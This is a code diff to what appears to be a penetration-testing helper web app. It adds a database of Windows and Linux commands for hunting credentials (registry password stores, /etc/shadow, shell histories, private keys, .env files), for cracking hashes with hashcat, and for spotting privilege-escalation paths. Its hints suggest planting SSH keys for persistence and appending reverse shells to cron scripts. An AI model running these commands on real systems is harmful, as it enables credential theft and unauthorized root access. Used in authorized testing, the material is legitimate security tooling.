+        {p:'Private key files',c:'dir /s /b id_rsa id_dsa id_ecdsa id_ed25519 *.pem *.ppk *.pfx *.p12 2>nul',h:'SSH and TLS private keys. .ppk = PuTTY format. .pfx/.p12 = PKCS12 cert+key bundles.'},
+        {p:'Credential and backup files',c:'dir /s /b *password* *credential* *secret* *creds* *passwd* 2>nul',h:'Broad search for credential-named files. Check every result.'},
+        {p:'Config and environment files',c:'dir /s /b *.env .env *.conf *.cfg *.ini 2>nul',h:'Environment files often contain full credential sets for web applications.'},
+        {p:'Office macro-enabled files',c:'dir /s /b *.xlsm *.docm *.xlam *.dotm *.pptm 2>nul',h:'Macro-enabled Office files may contain embedded credentials or VBA credential harvesting lures.'},
+      ]},
+      {name:'Registry Credential Stores',cmds:[
+        {p:'AutoLogon credentials (plaintext!)',c:'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v AltDefaultPassword',h:'CRITICAL: AutoLogon stores domain + username + password in plaintext. Common on kiosk and service machines.'},
+        {p:'PuTTY saved sessions',c:'reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s',h:'Lists saved SSH sessions with hostnames, usernames, and private key paths. Reveals internal SSH infrastructure.'},
+        {p:'WinSCP saved credentials',c:'reg query "HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions" /s',h:'WinSCP stores passwords with weak XOR encryption. Decrypt with: github.com/anoopengineer/winscppasswd'},
+        {p:'VNC saved passwords',c:'reg query HKLM\\SOFTWARE\\RealVNC\\WinVNC4 /v Password 2>nul\nreg query HKCU\\Software\\ORL\\WinVNC3 /v Password 2>nul\nreg query HKLM\\SOFTWARE\\TightVNC\\Server /v Password 2>nul',h:'VNC passwords are DES-encrypted with a fixed public key — trivially decryptable.'},
+        {p:'Windows Credential Manager',c:'cmdkey /list',h:'Lists stored credentials. If admin creds stored: runas /savecred /user:DOMAIN\\admin cmd.exe'},
+        {p:'SNMP community strings',c:'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities',h:'SNMP community strings — read/write access to network devices. Check for non-default values.'},
+      ]},
+      {name:'Hash Patterns (Grep / Identify)',cmds:[
+        {p:'NTLM hash — LM:NTLM format',c:'Select-String -Path .\\*.txt -Pattern "[0-9a-fA-F]{32}:[0-9a-fA-F]{32}" -CaseSensitive:$false',h:'secretsdump output format. Crack NTLM (right 32 chars): hashcat -m 1000 hashes.txt rockyou.txt'},
+        {p:'Net-NTLMv2 hash',c:'Select-String -Path .\\*.txt -Pattern "[a-zA-Z0-9]+::[a-zA-Z0-9]+:[a-fA-F0-9]{16}:[a-fA-F0-9]{32}:[a-fA-F0-9]+" -CaseSensitive:$false',h:'Captured by Responder. Format: user::domain:challenge:hmac:blob. Crack: hashcat -m 5600'},
+        {p:'Kerberoast TGS hash',c:'Select-String -Path .\\*.txt -Pattern "\\$krb5tgs\\$23\\$" -CaseSensitive:$false',h:'Kerberoasted TGS ticket. Crack: hashcat -m 13100 hash.txt rockyou.txt'},
+        {p:'AS-REP roast hash',c:'Select-String -Path .\\*.txt -Pattern "\\$krb5asrep\\$23\\$" -CaseSensitive:$false',h:'AS-REP roasted hash — account has no Kerberos pre-auth required. Crack: hashcat -m 18200 hash.txt rockyou.txt'},
+        {p:'bcrypt hash',c:'Select-String -Path .\\*.txt -Pattern "\\$2[ayb]\\$[0-9]{2}\\$[a-zA-Z0-9./]{53}" -CaseSensitive:$false',h:'bcrypt is slow. hashcat -m 3200. Common in web app user databases.'},
+        {p:'SHA-256 / SHA-512 hex',c:'Select-String -Path .\\*.txt -Pattern "[0-9a-fA-F]{64}" -CaseSensitive:$false',h:'64 hex = SHA-256 (hashcat -m 1400). 128 hex = SHA-512 (hashcat -m 1700). Confirm format before cracking.'},
+      ]},
+    ],
+  },
+  'regex-lin':{
+    label:'Regex: Linux', desc:'Credential & Pattern Hunting',
+    categories:[
+      {name:'Credential Hunting — File Content',cmds:[
+        {p:'Password strings in config directories',c:'grep -rn "password\\|passwd\\|pwd\\|secret\\|credential" /etc /var/www /opt /home 2>/dev/null | grep -v ".pyc\\|Binary"',h:'Start here — covers most credential-containing directories. /s suppressed by 2>/dev/null automatically.'},
+        {p:'Password assignment pattern (regex)',c:'grep -rEn "(password|passwd|pwd)\\s*[=:]\\s*\\S+" /etc /var/www /opt /home 2>/dev/null',h:'Matches password=value and password: value patterns. More precise than keyword search.'},
+        {p:'API keys and tokens',c:'grep -rEn "(api_key|apikey|api-key|access_token|secret_key|client_secret)\\s*[=:]\\s*\\S+" / 2>/dev/null | grep -v proc',h:'Catches API credentials in config and code files. Look for AWS_ACCESS_KEY, GITHUB_TOKEN, etc.'},
+        {p:'Database DSN connection strings',c:'grep -rEn "(mysql|postgresql|postgres|mongodb|redis)://[a-zA-Z0-9_-]+:[^@\\s]+@" / 2>/dev/null',h:'DSN-format connection strings with embedded credentials. Common in .env and settings files.'},
+        {p:'Private key headers in files',c:'grep -rln "BEGIN.*PRIVATE KEY\\|BEGIN RSA PRIVATE\\|BEGIN OPENSSH PRIVATE" / 2>/dev/null',h:'-l lists only filenames. Check each for missing passphrase: ssh-keygen -y -f keyfile (no passphrase = prints pubkey without prompt).'},
+        {p:'Credentials in .env files',c:'find / -name ".env" -o -name "*.env" 2>/dev/null | xargs grep -l "PASSWORD\\|SECRET\\|KEY\\|TOKEN" 2>/dev/null',h:'.env files contain app credentials. Common in web app root directories under /var/www or /opt.'},
+      ]},
+      {name:'Interesting System Files',cmds:[
+        {p:'/etc/shadow — read if possible',c:'cat /etc/shadow 2>/dev/null || ls -la /etc/shadow',h:'Contains hashed passwords for all local users. $1$=MD5(500) $2b$=bcrypt(3200) $5$=SHA256(7400) $6$=SHA512(1800) $y$=yescrypt(3400) — numbers = hashcat modes.'},
+        {p:'Shell history files (all users)',c:'find / -name ".bash_history" -o -name ".zsh_history" -o -name ".sh_history" -o -name ".fish_history" 2>/dev/null | xargs cat 2>/dev/null',h:'History captures everything typed — including passwords passed with -p flags or -pass arguments.'},
+        {p:'.netrc credential files',c:'find / -name ".netrc" 2>/dev/null | xargs cat 2>/dev/null',h:'.netrc stores FTP/HTTP credentials in plaintext. Format: machine HOST login USER password PASS'},
+        {p:'Apache / Nginx htpasswd files',c:'find / -name ".htpasswd" -o -name "htpasswd" 2>/dev/null | xargs cat 2>/dev/null',h:'HTTP Basic Auth password files. Hash: user:$apr1$... (MD5-APR). Crack: hashcat -m 1600'},
+        {p:'SSH authorized_keys (all users)',c:'find / -name "authorized_keys" 2>/dev/null | xargs cat 2>/dev/null',h:'Shows public keys allowed to SSH in. Add your own public key here for persistence if write access available.'},
+        {p:'known_hosts (infrastructure map)',c:'find / -name "known_hosts" 2>/dev/null | xargs cat 2>/dev/null',h:'SSH hosts the user has connected to — reveals internal infrastructure. Hashed hostnames can be cracked with ssh-keyscan.'},
+      ]},
+      {name:'Web Application Config Files',cmds:[
+        {p:'WordPress DB credentials',c:'find / -name "wp-config.php" 2>/dev/null | xargs grep -E "DB_(NAME|USER|PASSWORD|HOST)" 2>/dev/null',h:'WordPress DB credentials. DB user may have FILE privilege → LOAD_FILE/INTO OUTFILE for file read/webshell.'},
+        {p:'Django settings (SECRET_KEY + DB)',c:'find / -name "settings.py" 2>/dev/null | xargs grep -E "(SECRET_KEY|DATABASES|PASSWORD)" 2>/dev/null',h:'Django SECRET_KEY signs session cookies — forge sessions if leaked. DB password = direct database access.'},
+        {p:'Ruby on Rails database.yml',c:'find / -name "database.yml" 2>/dev/null | xargs cat 2>/dev/null',h:'Rails DB config with production credentials. Also check secrets.yml and credentials.yml.enc (needs master.key).'},
+        {p:'PHP database connection files',c:'find /var/www /srv /opt -name "*.php" 2>/dev/null | xargs grep -El "(db_pass|password|mysql_connect|PDO|mysqli)" 2>/dev/null',h:'PHP DB code often has hardcoded credentials. Focus on config.php, db.php, database.php, settings.php.'},
+        {p:'Python / Node.js config files',c:'find / -name "*.cfg" -o -name "*.conf" 2>/dev/null | xargs grep -El "(password|secret|token|key)" 2>/dev/null\nfind / -name "*.json" -not -path "*/node_modules/*" 2>/dev/null | xargs grep -El "(password|secret|apiKey)" 2>/dev/null',h:'Python apps use .cfg (ConfigParser) or .env. Node.js uses config.json or settings.json — exclude node_modules.'},
+      ]},
+      {name:'File Name Discovery',cmds:[
+        {p:'Private SSH key files',c:'find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null',h:'Private keys without passphrase = instant SSH access. Test: ssh-keygen -y -f keyfile (prompts for passphrase only if protected).'},
+        {p:'KeePass / password manager DBs',c:'find / -name "*.kdbx" -o -name "*.kdb" -o -name "*.lpd" 2>/dev/null',h:'Password manager databases. KeePass: hashcat -m 13400 for master password. May be unlocked in memory if process is running.'},
+        {p:'VPN config files',c:'find / -name "*.ovpn" -o -name "*.pcf" -o -name "*.vpn" 2>/dev/null',h:'VPN configs may contain embedded certs, private keys, and credentials. .ovpn is plaintext — grep for auth-user-pass.'},
+        {p:'Backup and archive files',c:'find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.orig" -o -name "*.swp" 2>/dev/null | grep -v proc',h:'Backup files often contain old configs with credentials. .swp = Vim swap files (unsaved content from crashed sessions).'},
+        {p:'Temp and staging directories',c:'find /tmp /var/tmp /dev/shm -type f 2>/dev/null\nls -la /var/backups/',h:'/tmp and /dev/shm are world-writable — tools and staged files land here. /var/backups may have passwd.bak or shadow.bak.'},
+        {p:'Readable root-owned config files',c:'find / -readable -user root -not -path "/proc/*" -not -path "/sys/*" -type f 2>/dev/null | grep -E "(config|conf|pass|cred|secret|key)" | head -30',h:'Root-owned but world-readable = misconfiguration. Filtered to credential-related names to reduce noise.'},
+      ]},
+      {name:'Hash Patterns (Identify & Grep)',cmds:[
+        {p:'Linux shadow hash formats',c:'grep -v ":\\*\\|:!" /etc/shadow 2>/dev/null',h:'Filters out locked (!) and disabled (*) accounts — shows only accounts with actual password hashes. $1$=MD5 $2b$=bcrypt $5$=SHA256 $6$=SHA512 $y$=yescrypt'},
+        {p:'MD5 hash (32 hex chars)',c:'grep -rEn "[^a-fA-F0-9][0-9a-fA-F]{32}[^a-fA-F0-9]" /var/www /opt /home 2>/dev/null | head -20',h:'32 hex chars = MD5. hashcat -m 0 for raw MD5. Verify it is not NTLM (both are 32 chars — context determines the mode).'},
+        {p:'SHA-256 hash (64 hex chars)',c:'grep -rEn "[0-9a-fA-F]{64}" /var/www /opt /home 2>/dev/null | grep -v ".pyc" | head -20',h:'SHA-256 = hashcat -m 1400. Also check if SHA-224 (56 chars) or SHA-384 (96 chars). Confirm format before cracking.'},
+        {p:'bcrypt hash pattern',c:'grep -rEn "\\$2[ayb]\\$[0-9][0-9]\\$[a-zA-Z0-9./]{53}" / 2>/dev/null | head -20',h:'bcrypt is slow — hashcat -m 3200. Common in web app user databases (htpasswd, Django, Laravel, etc.).'},
+        {p:'Net-NTLMv2 (from Responder logs)',c:'grep -rEn "[a-zA-Z0-9]+::[a-zA-Z0-9]+:[a-fA-F0-9]{16}:[a-fA-F0-9]{32}:[a-fA-F0-9]+" /usr/share/responder/logs/ 2>/dev/null',h:'Net-NTLMv2 hashes captured by Responder. Crack: hashcat -m 5600 hash.txt rockyou.txt'},
+        {p:'JWT token pattern',c:'grep -rEn "eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+" /var/www /opt /home 2>/dev/null | head -10',h:'JWT starts with eyJ (base64 of {). Decode header+payload: echo PART | base64 -d. Crack weak secret: hashcat -m 16500'},
+      ]},
+      {name:'Privilege Escalation Patterns',cmds:[
+        {p:'SUID binaries (non-standard)',c:'find / -perm -4000 -type f 2>/dev/null | grep -Ev "(/bin/|/sbin/|/usr/bin/|/usr/sbin/|/usr/lib/)"',h:'Filters standard system SUID bins. Check every remaining entry on GTFOBins immediately — common finds: find, vim, python, nmap, perl.'},
+        {p:'SGID binaries',c:'find / -perm -2000 -type f 2>/dev/null | grep -Ev "(/bin/|/sbin/|/usr/bin/|/usr/sbin/|/usr/lib/)"',h:'SGID runs as the file group. Less common but exploitable — check GTFOBins for each result.'},
+        {p:'World-writable files (non-tmp)',c:'find / -perm -o+w -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -Ev "^/tmp|^/var/tmp|^/dev"',h:'World-writable outside tmp = misconfiguration. Focus on scripts executed by cron or systemd as root.'},
+        {p:'Cron jobs (all locations)',c:'cat /etc/crontab 2>/dev/null\nls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ 2>/dev/null\ncrontab -l 2>/dev/null',h:'Find scripts run by root — check if writable: ls -la /path/to/script. Writable = append reverse shell.'},
+        {p:'Capabilities on binaries',c:'getcap -r / 2>/dev/null',h:'cap_setuid+ep = instant root via python/ruby/perl. cap_net_raw = packet capture. Check every result on GTFOBins.'},
+        {p:'NFS exports — no_root_squash',c:'cat /etc/exports 2>/dev/null\nshowmount -e TARGETIP 2>/dev/null',h:'no_root_squash = mount from attacker, create SUID binary as root, execute on target = instant root.'},
+      ]},
+    ],
+  },
 };
 
 // ═══════════════════════════════════════════════════
 //  STATE
 // ═══════════════════════════════════════════════════
 const STORAGE_KEY = 'reconflow_v3';
-const DEFAULT_STATE = {ip:'',svcStatus:{},checks:{},notes:{},activeTool:{},session:[],collapsed:{},infoOpen:{},lang:'en',sectionOpen:{services:true,tools:true,shells:true,env:true},toolFavorites:{},customCmds:{},cmdLog:[],sessionName:'SESSION 1',targetVars:{port:'',domain:'',wordlist:'',ips:[''],users:[''],passes:[''],hashes:['']},cmdEdits:{}};
+const DEFAULT_STATE = {ip:'',svcStatus:{},checks:{},notes:{},activeTool:{},session:[],collapsed:{},infoOpen:{},lang:'en',sectionOpen:{services:true,tools:true,shells:true,env:true,regex:true},toolFavorites:{},customCmds:{},cmdLog:[],sessionName:'SESSION 1',targetVars:{port:'',domain:'',wordlist:'',ips:[''],users:[''],passes:[''],hashes:['']},cmdEdits:{}};
 
 let state = loadState();
 let currentSvc = null;
@@ -3115,6 +3319,24 @@ function renderSidebar() {
 
   if (envOpen) {
     ENUM_ORDER.forEach(key => {
+      const item = ENUM_DB[key];
+      sb.insertAdjacentHTML('beforeend', `
+        <button class="tool-nav-btn${currentSvc===key?' active':''}" onclick="navigate('${key}')">
+          <span class="svc-label">${item.label}</span>
+        </button>
+      `);
+    });
+  }
+
+  // REGEX section
+  const regexOpen = state.sectionOpen.regex !== false;
+  sb.insertAdjacentHTML('beforeend',`<hr class="sb-sep">
+    <div class="sb-section-hdr" onclick="toggleSection('regex')">
+      <span>REGEX</span>
+      <span class="sb-section-arrow${regexOpen?' open':''}">▶</span>
+    </div>`);
+  if (regexOpen) {
+    REGEX_ORDER.forEach(key => {
       const item = ENUM_DB[key];
       sb.insertAdjacentHTML('beforeend', `
         <button class="tool-nav-btn${currentSvc===key?' active':''}" onclick="navigate('${key}')">
